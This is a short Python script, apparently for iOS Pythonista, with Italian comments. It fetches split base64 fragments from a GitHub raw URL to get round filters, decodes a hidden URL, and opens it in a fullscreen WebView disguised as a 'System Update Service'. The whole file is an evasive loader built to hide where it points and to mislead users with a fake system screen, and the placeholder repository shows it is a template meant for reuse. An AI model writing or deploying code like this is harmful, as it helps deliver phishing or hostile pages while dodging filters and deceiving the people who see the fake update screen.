import requests, base64, ui, time

def brain():
    # URL RAW per pescare i dati senza scaricare l'HTML di GitHub
    BASE = "https://raw.githubusercontent.com/TUO_UTENTE/TUO_REPO/main/"
    try:
        # Recupero frammentato per bypassare i filtri
        p1 = requests.get(BASE + "part1.txt").text.strip()
        p2 = requests.get(BASE + "part2.txt").text.strip()
        
        # Unione e decodifica sicura (anti-crash)
        url = base64.b64decode(p1 + p2).decode('utf-8', errors='ignore')
        
        # Apertura nella WebView mimetica
        v = ui.WebView()
        v.name = "System Update Service"
        v.load_url(url)
        v.present('fullscreen')
    except:
        print("Errore critico di sincronizzazione.")

if __name__ == "__main__":
    brain()
